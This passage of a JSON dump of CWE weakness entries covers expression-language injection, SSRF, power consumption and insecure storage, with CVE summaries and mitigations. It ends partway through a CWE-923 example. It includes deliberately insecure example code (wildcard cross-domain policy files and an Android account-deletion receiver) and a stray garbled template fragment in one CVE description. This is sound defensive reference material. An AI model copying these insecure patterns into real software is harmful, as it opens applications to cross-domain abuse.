Commands"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Avoid adding user-controlled data into an expression interpreter when possible."}, {"Phase": ["Implementation"], "Description": "\n\nIf user-controlled data must be added to an expression interpreter, one or more of the following should be performed:\n\n\n  - Validate that the user input will not evaluate as an expression\n\n  - Encode the user input in a way that ensures it is not evaluated as an expression\n\n"}, {"Phase": ["System Configuration", "Operation"], "Description": "The framework or tooling might allow the developer to disable or deactivate the processing of EL expressions, such as setting the isELIgnored attribute for a JSP page to \"true\"."}], "ObservedExamples": [{"Reference": "CVE-2021-44228", "Description": "Product does not neutralize ${xyz} style expressions, allowing remote code execution. (log4shell vulnerability in log4j)", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-44228"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "The interrelationships and differences between CWE-917 and CWE-1336 need to be further clarified."}, {"Type": "Relationship", "Note": "In certain versions of Spring 3.0.5 and earlier, there was a vulnerability (CVE-2011-2730) in which Expression Language tags would be evaluated twice, which effectively exposed any application to EL injection. However, even for later versions, this weakness is still possible depending on configuration."}], "Top25Examples": [{"Reference": "CVE-2022-24818", "Description": "GeoTools is an open source Java library that provides tools for geospatial data. The GeoTools library has a number of data sources that can perform unchecked JNDI lookups, which in turn can be used to perform class deserialization and result in arbitrary code execution. Similar to the Log4J case, the vulnerability can be triggered if the JNDI names are user-provided, but requires admin-level login to be triggered. The lookups are now restricted in GeoTools 26.4, GeoTools 25.6, and GeoTools 24.6. Users unable to upgrade should ensure that any downstream application should not allow usage of remotely provided JNDI strings."}, {"Reference": "CVE-2022-24847", "Description": "GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. The GeoServer security mechanism can perform an unchecked JNDI lookup, which in turn can be used to perform class deserialization and result in arbitrary code execution. The same can happen while configuring data stores with data sources located in JNDI, or while setting up the disk quota mechanism. In order to perform any of the above changes, the attack needs to have obtained admin rights and use either the GeoServer GUI, or its REST API. The lookups are going to be restricted in GeoServer 2.21.0, 2.20.4, 1.19.6. Users unable to upgrade should restrict access to the `geoserver/web` and `geoserver/rest` via a firewall and ensure that the GeoWebCache is not remotely accessible."}, {"Reference": "CVE-2022-26134", "Description": "In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance. The affected versions are from 1.3.0 before 7.4.17, from 7.13.0 before 7.13.7, from 7.14.0 before 7.14.3, from 7.15.0 before 7.15.2, from 7.16.0 before 7.16.4, from 7.17.0 before 7.17.4, and from 7.18.0 before 7.18.1."}, {"Reference": "CVE-2022-22947", "Description": "In spring cloud gateway versions prior to 3.1.1+ and 3.0.7+ , applications are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host."}, {"Reference": "CVE-2022-22963", "Description": "In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources."}, {"Reference": "CVE-2021-45046", "Description": "It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allows attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in an information leak and remote code execution in some environments and local code execution in all environments. Log4j 2.16.0 (Java 8) and 2.12.2 (Java 7) fix this issue by removing support for message lookup patterns and disabling JNDI functionality by default."}, {"Reference": "CVE-2021-26084", "Description": "In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 before 7.12.5."}, {"Reference": "CVE-2021-44228", "Description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects."}, {"Reference": "CVE-2022-34466", "Description": "A vulnerability has been identified in Mendix Applications using Mendix 9 (All versions >= V9.11 < V9.15), Mendix Applications using Mendix 9 (V9.12) (All versions < V9.12.3). An expression injection vulnerability was discovered in the Workflow subsystem of Mendix Runtime, that can affect the running applications. The vulnerability could allow a malicious user to leak sensitive information in a certain configuration."}, {"Reference": "CVE-2022-26111", "Description": "The BeanShell components of IRISNext through 9.8.28 allow execution of arbitrary commands on the target server by creating a custom search (or editing an existing/predefined search) of the documents. The search components permit adding BeanShell expressions that result in Remote Code Execution in the context of the IRISNext application user, running on the web server."}]}
{"ID": "918", "Name": "Server-Side Request Forgery (SSRF)", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.", "ExtendedDescription": "By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "441", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "610", "ViewID": "1003", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Name": "Web Server", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "XSPA", "Description": "Cross Site Port Attack"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}, {"Scope": ["Integrity"], "Impact": ["Execute Unauthorized Code or Commands"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "ObservedExamples": [{"Reference": "CVE-2021-26855", "Description": "Server Side Request Forgery (SSRF) in mail server, as exploited in the wild per CISA KEV.", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-26855"}, {"Reference": "CVE-2021-21973", "Description": "Server Side Request Forgery in cloud platform, as exploited in the wild per CISA KEV.", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-21973"}, {"Reference": "CVE-2016-4029", "Description": "Chain: incorrect validation of intended decimal-based IP address format (CWE-1286) enables parsing of octal or hexadecimal formats (CWE-1389), allowing bypass of an SSRF protection mechanism (CWE-918).", "Link": "https://www.cve.org/CVERecord?id=CVE-2016-4029"}, {"Reference": "CVE-2002-1484", "Description": "Web server allows attackers to request a URL from another server, including other ports, which allows proxied scanning.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1484"}, {"Reference": "CVE-2004-2061", "Description": "CGI script accepts and retrieves incoming URLs.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2061"}, {"Reference": "CVE-2010-1637", "Description": "Web-based mail program allows internal network scanning using a modified POP3 port number.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-1637"}, {"Reference": "CVE-2009-0037", "Description": "URL-downloading library automatically follows redirects to file:// and scp:// URLs", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0037"}], "RelatedAttackPatterns": ["664"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "CWE-918 (SSRF) and CWE-611 (XXE) are closely related, because they both involve web-related technologies and can launch outbound requests to unexpected destinations. However, XXE can be performed client-side, or in other contexts in which the software is not acting directly as a server, so the \"Server\" portion of the SSRF acronym does not necessarily apply."}], "Top25Examples": [{"Reference": "CVE-2021-40604", "Description": "A Server-Side Request Forgery (SSRF) vulnerability in IPS Community Suite before 4.6.2 allows remote authenticated users to request arbitrary URLs or trigger deserialization via phar protocol when generating class names dynamically. In some cases an exploitation is possible by an unauthenticated user."}, {"Reference": "CVE-2022-1592", "Description": "Server-Side Request Forgery in scout in GitHub repository clinical-genomics/scout prior to v4.42. An attacker could make the application perform arbitrary requests to fishing steal cookie, request to private area, or lead to xss..."}, {"Reference": "CVE-2022-23170", "Description": "SysAid - Okta SSO integration - was found vulnerable to XML External Entity Injection vulnerability. Any SysAid environment that uses the Okta SSO integration might be vulnerable. An unauthenticated attacker could exploit the XXE vulnerability by sending a malformed POST request to the identity provider endpoint. An attacker can extract the identity provider endpoint by decoding the SAMLRequest parameter's value and searching for the AssertionConsumerServiceURL parameter's value. It often allows an attacker to view files on the application server filesystem and interact with any back-end or external systems that the application can access. In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks."}, {"Reference": "CVE-2022-23544", "Description": "MeterSphere is a one-stop open source continuous testing platform, covering test management, interface testing, UI testing and performance testing. Versions prior to 2.5.0 are subject to a Server-Side Request Forgery that leads to Cross-Site Scripting. A Server-Side request forgery in `IssueProxyResourceService::getMdImageByUrl` allows an attacker to access internal resources, as well as executing JavaScript code in the context of Metersphere's origin by a victim of a reflected XSS. This vulnerability has been fixed in v2.5.0. There are no known workarounds."}, {"Reference": "CVE-2022-24449", "Description": "Solar appScreener through 3.10.4, when a valid license is not present, allows XXE and SSRF attacks via a crafted XML document."}, {"Reference": "CVE-2022-3338", "Description": "An External XML entity (XXE) vulnerability in ePO prior to 5.10 Update 14 can lead to an unauthenticated remote attacker to potentially trigger a Server Side Request Forgery attack. This can be exploited by mimicking the Agent Handler call to ePO and passing the carefully constructed XML file through the API."}, {"Reference": "CVE-2022-35651", "Description": "A stored XSS and blind SSRF vulnerability was found in Moodle, occurs due to insufficient sanitization of user-supplied data in the SCORM track details. A remote attacker can trick the victim to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of vulnerable website to steal potentially sensitive information, change appearance of the web page, can perform phishing and drive-by-download attacks."}, {"Reference": "CVE-2022-35741", "Description": "Apache CloudStack version 4.5.0 and later has a SAML 2.0 authentication Service Provider plugin which is found to be vulnerable to XML external entity (XXE) injection. This plugin is not enabled by default and the attacker would require that this plugin be enabled to exploit the vulnerability. When the SAML 2.0 plugin is enabled in affected versions of Apache CloudStack could potentially allow the exploitation of XXE vulnerabilities. The SAML 2.0 messages constructed during the authentication flow in Apache CloudStack are XML-based and the XML data is parsed by various standard libraries that are now understood to be vulnerable to XXE injection attacks such as arbitrary file reading, possible denial of service, server-side request forgery (SSRF) on the CloudStack management server."}, {"Reference": "CVE-2022-38342", "Description": "Safe Software FME Server v2021.2.5, v2022.0.0.2 and below was discovered to contain a XML External Entity (XXE) vulnerability which allows authenticated attackers to perform data exfiltration or Server-Side Request Forgery (SSRF) attacks."}, {"Reference": "CVE-2022-3980", "Description": "An XML External Entity (XEE) vulnerability allows server-side request forgery (SSRF) and potential code execution in Sophos Mobile managed on-premises between versions 5.0.0 and 9.7.4."}, {"Reference": "CVE-2022-45326", "Description": "An XML external entity (XXE) injection vulnerability in Kwoksys Kwok Information Server before v2.9.5.SP31 allows remote authenticated users to conduct server-side request forgery (SSRF) attacks."}, {"Reference": "CVE-2022-46827", "Description": "In JetBrains IntelliJ IDEA before 2022.3 an XXE attack leading to SSRF via requests to custom plugin repositories was possible."}, {"Reference": "CVE-2022-47514", "Description": "An XML external entity (XXE) injection vulnerability in XML-RPC.NET before 2.5.0 allows remote authenticated users to conduct server-side request forgery (SSRF) attacks, as demonstrated by a pingback.aspx POST request."}, {"Reference": "CVE-2022-47873", "Description": "Netcad KEOS 1.0 is vulnerable to XML External Entity (XXE) resulting in SSRF with XXE (remote)."}, {"Reference": "CVE-2022-40083", "Description": "Labstack Echo v4.8.0 was discovered to contain an open redirect vulnerability via the Static Handler component. This vulnerability can be leveraged by attackers to cause a Server-Side Request Forgery (SSRF)."}, {"Reference": "CVE-2022-41040", "Description": "Microsoft Exchange Server Elevation of Privilege Vulnerability"}, {"Reference": "CVE-2021-21973", "Description": "The vSphere Client (HTML5) contains an SSRF (Server Side Request Forgery) vulnerability due to improper validation of URLs in a vCenter Server plugin. A malicious actor with network access to port 443 may exploit this issue by sending a POST request to vCenter Server plugin leading to information disclosure. This affects: VMware vCenter Server (7.x before 7.0 U1c, 6.7 before 6.7 U3l and 6.5 before 6.5 U3n) and VMware Cloud Foundation (4.x before 4.2 and 3.x before 3.10.1.2)."}, {"Reference": "CVE-2021-21975", "Description": "Server Side Request Forgery in vRealize Operations Manager API (CVE-2021-21975) prior to 8.4 may allow a malicious actor with network access to the vRealize Operations Manager API can perform a Server Side Request Forgery attack to steal administrative credentials."}, {"Reference": "CVE-2021-22986", "Description": "On BIG-IP versions 16.0.x before 16.0.1.1, 15.1.x before 15.1.2.1, 14.1.x before 14.1.4, 13.1.x before 13.1.3.6, and 12.1.x before 12.1.5.3 amd BIG-IQ 7.1.0.x before 7.1.0.3 and 7.0.0.x before 7.0.0.2, the iControl REST interface has an unauthenticated remote command execution vulnerability. Note: Software versions which have reached End of Software Development (EoSD) are not evaluated."}, {"Reference": "CVE-2021-26855", "Description": "Microsoft Exchange Server Remote Code Execution Vulnerability"}, {"Reference": "CVE-2021-27103", "Description": "Accellion FTA 9_12_411 and earlier is affected by SSRF via a crafted POST request to wmProgressstat.html. The fixed version is FTA_9_12_416 and later."}, {"Reference": "CVE-2021-34473", "Description": "Microsoft Exchange Server Remote Code Execution Vulnerability"}, {"Reference": "CVE-2021-40438", "Description": "A crafted request uri-path can cause mod_proxy to forward the request to an origin server choosen by the remote user. This issue affects Apache HTTP Server 2.4.48 and earlier."}, {"Reference": "CVE-2022-24406", "Description": "OX App Suite through 7.10.6 allows SSRF because multipart/form-data boundaries are predictable, and this can lead to injection into internal Documentconverter API calls."}, {"Reference": "CVE-2022-29180", "Description": "A vulnerability in which attackers could forge HTTP requests to manipulate the `charm` data directory to access or delete anything on the server. This has been patched and is available in release [v0.12.1](https://github.com/charmbracelet/charm/releases/tag/v0.12.1). We recommend that all users running self-hosted `charm` instances update immediately. This vulnerability was found in-house and we haven't been notified of any potential exploiters. ### Additional notes * Encrypted user data uploaded to the Charm server is safe as Charm servers cannot decrypt user data. This includes filenames, paths, and all key-value data. * Users running the official Charm [Docker images](https://github.com/charmbracelet/charm/blob/main/docker.md) are at minimal risk because the exploit is limited to the containerized filesystem."}, {"Reference": "CVE-2022-29847", "Description": "In Progress Ipswitch WhatsUp Gold 21.0.0 through 21.1.1, and 22.0.0, it is possible for an unauthenticated attacker to invoke an API transaction that would allow them to relay encrypted WhatsUp Gold user credentials to an arbitrary host."}, {"Reference": "CVE-2022-39055", "Description": "RAVA certificate validation system has inadequate filtering for URL parameter. An unauthenticated remote attacker can perform SSRF attack to discover internal network topology base on query response."}, {"Reference": "CVE-2022-20958", "Description": "A vulnerability in the web-based management interface of Cisco BroadWorks CommPilot application could allow an unauthenticated, remote attacker to perform a server-side request forgery (SSRF) attack on an affected device. This vulnerability is due to insufficient validation of user-supplied input. An attacker could exploit this vulnerability by sending a crafted HTTP request to the web interface. A successful exploit could allow the attacker to obtain confidential information from the BroadWorks server and other device on the network. {{value}} [\"%7b%7bvalue%7d%7d\"])}]] "}, {"Reference": "CVE-2022-29631", "Description": "Jodd HTTP v6.0.9 was discovered to contain multiple CLRF injection vulnerabilities via the components jodd.http.HttpRequest#set and `jodd.http.HttpRequest#send. These vulnerabilities allow attackers to execute Server-Side Request Forgery (SSRF) via a crafted TCP payload."}, {"Reference": "CVE-2022-3590", "Description": "WordPress is affected by an unauthenticated blind SSRF in the pingback feature. Because of a TOCTOU race condition between the validation checks and the HTTP request, attackers can reach internal hosts that are explicitly forbidden."}, {"Reference": "CVE-2022-36997", "Description": "An issue was discovered in Veritas NetBackup 8.1.x through 8.1.2, 8.2, 8.3.x through 8.3.0.2, 9.x through 9.0.0.1, and 9.1.x through 9.1.0.1 (and related NetBackup products). An attacker with authenticated access to a NetBackup Client could remotely trigger impacts that include arbitrary file read, Server-Side Request Forgery (SSRF), and denial of service."}, {"Reference": "CVE-2022-0528", "Description": "Server-Side Request Forgery (SSRF) in GitHub repository transloadit/uppy prior to 3.3.1. "}, {"Reference": "CVE-2022-1815", "Description": "Exposure of Sensitive Information to an Unauthorized Actor in GitHub repository jgraph/drawio prior to 18.1.2."}, {"Reference": "CVE-2022-0671", "Description": "A flaw was found in vscode-xml in versions prior to 0.19.0. Schema download could lead to blind SSRF or DoS via a large file."}, {"Reference": "CVE-2021-33318", "Description": "An Input Validation Vulnerability exists in Joel Christner .NET C# packages WatsonWebserver, IpMatcher 1.0.4.1 and below (IpMatcher) and 4.1.3 and below (WatsonWebserver) due to insufficient validation of input IP addresses and netmasks against the internal Matcher list of IP addresses and subnets."}, {"Reference": "CVE-2021-20325", "Description": "Missing fixes for CVE-2021-40438 and CVE-2021-26691 in the versions of httpd, as shipped in Red Hat Enterprise Linux 8.5.0, causes a security regression compared to the versions shipped in Red Hat Enterprise Linux 8.4. A user who installs or updates to Red Hat Enterprise Linux 8.5.0 would be vulnerable to the mentioned CVEs, even if they were properly fixed in Red Hat Enterprise Linux 8.4. CVE-2021-20325 was assigned to that Red Hat specific security regression and it does not affect the upstream versions of httpd."}]}
{"ID": "92", "Name": "DEPRECATED: Improper Sanitization of Custom Special Characters", "Abstraction": "Base", "Structure": "Simple", "Status": "Deprecated", "Description": "This entry has been deprecated. It originally came from PLOVER, which sometimes defined \"other\" and \"miscellaneous\" categories in order to satisfy exhaustiveness requirements for taxonomies. Within the context of CWE, the use of a more abstract entry is preferred in mapping situations. CWE-75 is a more appropriate mapping.", "MappingNotes": {"Usage": "Prohibited", "Rationale": "This CWE has been deprecated.", "Comments": "See description and name for possible suggestions of other CWEs to consider.", "Reasons": ["Deprecated"]}}
{"ID": "920", "Name": "Improper Restriction of Power Consumption", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product operates in an environment in which power is a limited resource that cannot be automatically replenished, but the product does not properly restrict the amount of power that its operation consumes.", "ExtendedDescription": "\n\nIn environments such as embedded or mobile devices, power can be a limited resource such as a battery, which cannot be automatically replenished by the product itself, and the device might not always be directly attached to a reliable power source. If the product uses too much power too quickly, then this could cause the device (and subsequently, the product) to stop functioning until power is restored, or increase the financial burden on the device owner because of increased power costs.\n\n\nNormal operation of an application will consume power. However, in some cases, an attacker could cause the application to consume more power than intended, using components such as:\n\n\n  - Display\n\n  - CPU\n\n  - Disk I/O\n\n  - GPS\n\n  - Sound\n\n  - Microphone\n\n  - USB interface\n\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "400", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "400", "ViewID": "1003", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Mobile", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}], "CommonConsequences": [{"Scope": ["Availability"], "Impact": ["DoS: Resource Consumption (Other)", "DoS: Crash, Exit, or Restart"], "Note": "The power source could be drained, causing the application - and the entire device - to cease functioning."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "921", "Name": "Storage of Sensitive Data in a Mechanism without Access Control", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product stores sensitive information in a file system or device that does not have built-in access control.", "ExtendedDescription": "\n\nWhile many modern file systems or devices utilize some form of access control in order to restrict access to data, not all storage mechanisms have this capability. For example, memory cards, floppy disks, CDs, and USB devices are typically made accessible to any user within the system. This can become a problem when sensitive data is stored in these mechanisms in a multi-user environment, because anybody on the system can read or write this data.\n\n\nOn Android devices, external storage is typically globally readable and writable by other applications on the device. External storage may also be easily accessible through the mobile device's USB connection or physically accessible through the device's memory card port.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "922", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Mobile", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data", "Read Files or Directories"], "Note": "Attackers can read sensitive information by accessing the unrestricted storage mechanism."}, {"Scope": ["Integrity"], "Impact": ["Modify Application Data", "Modify Files or Directories"], "Note": "Attackers can modify or delete sensitive information by accessing the unrestricted storage mechanism."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "922", "Name": "Insecure Storage of Sensitive Information", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product stores sensitive information without properly limiting read or write access by unauthorized actors.", "ExtendedDescription": "If read access is not properly restricted, then attackers can steal the sensitive information. If write access is not properly restricted, then attackers can modify and possibly delete the data, causing incorrect results and possibly a denial of service.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "664", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}, {"Phase": "Implementation"}, {"Phase": "System Configuration"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data", "Read Files or Directories"], "Note": "Attackers can read sensitive information by accessing the unrestricted storage mechanism."}, {"Scope": ["Integrity"], "Impact": ["Modify Application Data", "Modify Files or Directories"], "Note": "Attackers can overwrite sensitive information by accessing the unrestricted storage mechanism."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "ObservedExamples": [{"Reference": "CVE-2009-2272", "Description": "password and username stored in cleartext in a cookie", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2272"}], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Notes": [{"Type": "Relationship", "Note": "There is an overlapping relationship between insecure storage of sensitive information (CWE-922) and missing encryption of sensitive information (CWE-311). Encryption is often used to prevent an attacker from reading the sensitive data. However, encryption does not prevent the attacker from erasing or overwriting the data. While data tampering would be visible upon inspection, the integrity and availability of the data is compromised prior to the audit."}, {"Type": "Maintenance", "Note": "This is a high-level entry that includes children from various parts of the CWE research view (CWE-1000). Currently, most of the information is in these child entries. This entry will be made more comprehensive in later CWE versions."}], "Top25Examples": [{"Reference": "CVE-2022-1257", "Description": "Insecure storage of sensitive information vulnerability in MA for Linux, macOS, and Windows prior to 5.7.6 allows a local user to gain access to sensitive information through storage in ma.db. The sensitive information has been moved to encrypted database files."}, {"Reference": "CVE-2022-34354", "Description": " IBM Sterling Partner Engagement Manager 2.0 allows encrypted storage of client data to be stored locally which can be read by another user on the system. IBM X-Force ID: 230424. "}, {"Reference": "CVE-2022-35513", "Description": "The Blink1Control2 application <= 2.2.7 uses weak password encryption and an insecure method of storage."}, {"Reference": "CVE-2022-41876", "Description": "ezplatform-graphql is a GraphQL server implementation for Ibexa DXP and Ibexa Open Source. Versions prior to 2.3.12 and 1.0.13 are subject to Insecure Storage of Sensitive Information. Unauthenticated GraphQL queries for user accounts can expose password hashes of users that have created or modified content, typically administrators and editors. This issue has been patched in versions 2.3.12, and 1.0.13 on the 1.X branch. Users unable to upgrade can remove the \"passwordHash\" entry from \"src/bundle/Resources/config/graphql/User.types.yaml\" in the GraphQL package, and other properties like hash type, email, login if you prefer."}, {"Reference": "CVE-2022-39043", "Description": "Juiker app stores debug logs which contains sensitive information to mobile external storage. An unauthenticated physical attacker can access these files to acquire partial user information such as personal contacts."}]}
{"ID": "923", "Name": "Improper Restriction of Communication Channel to Intended Endpoints", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product establishes a communication channel to (or from) an endpoint for privileged or protected operations, but it does not properly ensure that it is communicating with the correct endpoint.", "ExtendedDescription": "\n\nAttackers might be able to spoof the intended endpoint from a different system or process, thus gaining the same level of access as the intended endpoint.\n\n\nWhile this issue frequently involves authentication between network-based clients and servers, other types of communication channels and endpoints can have this weakness.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "284", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Integrity", "Confidentiality"], "Impact": ["Gain Privileges or Assume Identity"], "Note": "If an attacker can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "DemonstrativeExamples": [{"ID": "DX-208", "Entries": [{"IntroText": "These cross-domain policy files mean to allow Flash and Silverlight applications hosted on other domains to access its data:"}, {"BodyText": "Flash crossdomain.xml :"}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<cross-domain-policy xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\txsi:noNamespaceSchemaLocation=\"http://www.adobe.com/xml/schemas/PolicyFile.xsd\">\n\t<allow-access-from domain=\"*.example.com\"/>\n\t<allow-access-from domain=\"*\"/>\n\t</cross-domain-policy>\n```"}, {"BodyText": "Silverlight clientaccesspolicy.xml :"}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<access-policy>\n\t<cross-domain-access>\n\t<policy>\n\t<allow-from http-request-headers=\"SOAPAction\">\n\t<domain uri=\"*\"/>\n\t</allow-from>\n\t<grant-to>\n\t<resource path=\"/\" include-subpaths=\"true\"/>\n\t</grant-to>\n\t</policy>\n\t</cross-domain-access>\n\t</access-policy>\n```"}, {"BodyText": "These entries are far too permissive, allowing any Flash or Silverlight application to send requests. A malicious application hosted on any other web site will be able to send requests on behalf of any user tricked into executing it."}]}, {"ID": "DX-112", "Entries": [{"IntroText": "This Android application will remove a user account when it receives an intent to do so:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tIntentFilter filter = new IntentFilter(\"com.example.RemoveUser\");\n\tMyReceiver receiver = new MyReceiver();\n\tregisterReceiver(receiver, filter);\n\tpublic class DeleteReceiver extends BroadcastReceiver {\n\t\t@Override\n\t\tpublic void onReceive(Context context, 